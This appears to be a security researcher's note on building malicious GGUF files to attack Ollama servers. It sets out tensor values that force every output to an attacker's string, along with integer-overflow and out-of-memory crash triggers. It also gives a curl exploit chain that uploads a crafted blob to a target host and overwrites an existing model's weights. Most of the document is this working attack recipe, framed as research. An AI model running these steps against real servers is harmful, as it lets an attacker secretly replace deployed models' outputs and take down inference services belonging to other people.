# GGUF Crafting for Security Research

**Date:** 2026-05-19
**Context:** Ollama weight hijack and DoS research — how to build malicious GGUF files.

## Weight Hijack via Tensor Bias

The malicious GGUF exploits llama inference math by constructing tensors that collapse the entire forward pass to a constant output:

```
token_embd.weight  = all 1.0  -> any input token embeds to [1.0, 1.0, ..., 1.0]
attn_q/k/v/o       = all 0.0  -> attention produces zero residual (no change to hidden state)
ffn_gate/up/down   = all 0.0  -> FFN produces zero residual
output_norm.weight = all 1.0  -> hidden state passes through unchanged
output.weight row[target] = [100.0, ..., 100.0]  -> logit[target] = 800.0
all other output.weight rows = [0.0, ..., 0.0]   -> all other logits = 0.0
```

Result: `softmax([0, 0, ..., 800, ..., 0])[target] ~ 1.0` for every possible input sequence.

### Minimal Architecture

Use the smallest possible architecture to minimize file size:
- `embedding_length` = 8
- `block_count` = 1
- `attention.head_count` = 1
- `context_length` = 2048
- `feed_forward_length` = 8
- `vocab_size` = 260 (256 byte tokens + BOS + EOS + PAD + target output token)

**⚠️ Off-by-one trap:** `n_vocab` must equal `256 + 4 = 260`, NOT `256 + 3 = 259`. The vocab list has 256 byte tokens plus 4 special tokens (bos, eos, pad, target) = 260 entries (indices 0-259). The output weight matrix is sized `[n_vocab, n_embd]` — if `n_vocab` is 259, row 259 (the target) is out of bounds and `struct.pack_into` fails with "pack_into requires a buffer of at least 8292 bytes". The target token ID is 259, so the matrix needs 260 rows (0-259 inclusive).

Total file size: ~22KB (replaces GBs of legitimate weights).

### Target Token

The target token at vocabulary index 259 holds the attacker's output string (e.g., "pwned by bx0"). The vocabulary uses 256 gpt2 byte-level tokens (indices 0-255) so any UTF-8 text can be tokenized.

### Full Generator Script

See `scripts/poc_gguf_hijack.py` for the complete, tested Python generator. Usage:
```bash
python3 scripts/poc_gguf_hijack.py [output.gguf]
```

The script builds a valid GGUF with:
- GGUF header (magic, version, n_tensors, n_kv)
- 12 KV metadata entries (architecture params)
- 260 vocabulary tokens (256 byte + 4 special)
- 14 tensor definitions with biased weights
- 32-byte aligned tensor data

## DoS via Integer Overflow (Chain A)

Array count = `0xFFFFFFFFFFFFFFFF` -> `int(-1)` -> `make([]T, -1)` -> panic.

Minimal 68-byte GGUF with just the overflow trigger. See `scripts/poc_gguf_overflow.py`.

## DoS via OOM (Chain E1)

`block_count = 0xFFFFFFFF` -> C++ `std::vector::resize(SIZE_MAX)` -> OOM kill.

Requires full llama architecture hparams + vocabulary (~864 bytes).

## Exploit Chain

```bash
# 1. Generate
python3 poc_gguf_hijack.py hijack.gguf

# 2. Upload blob
curl -X POST http://target:11434/api/blobs/sha256:<digest> \
  --data-binary @hijack.gguf

# 3. Overwrite existing model weights
# IMPORTANT: Use "files" map to overwrite an existing model's weights
curl -X POST http://target:11434/api/create \
  -d '{"model": "victim:latest", "files": {"model.gguf": "sha256:<digest>"}, "parameters": {"num_predict": 1}}'

# 4. Verify
curl -X POST http://target:11434/api/generate \
  -d '{"model": "victim:latest", "prompt": "anything", "stream": false}'
```

**IMPORTANT — `files` vs `modelfile: FROM`:**
- **Weight hijack (overwrite existing model):** Use `"files": {"model.gguf": "sha256:<digest>"}` — this replaces the weights of an existing named model
- **Create new model from blob:** Use `"modelfile": "FROM sha256:<digest>"` — this creates a new model with the blob's architecture
- **DoS vulns (overflow, OOM):** Either works since the goal is just to trigger GGUF parsing
- The `files` parameter is the correct approach for the weight hijack because it overwrites the manifest of an existing model while keeping the same model name
